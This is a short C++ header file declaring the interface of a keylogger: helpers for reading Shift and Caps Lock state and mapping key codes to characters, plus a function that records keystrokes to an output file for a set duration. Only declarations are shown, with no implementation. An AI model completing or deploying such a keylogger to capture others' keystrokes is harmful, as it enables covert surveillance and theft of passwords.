#pragma once

bool isShiftPressed();

bool isCapsLockOn();

std::string getCharFromKey(int key);

void start_keylogger(const std::string& outputFilePath, int durationInSeconds);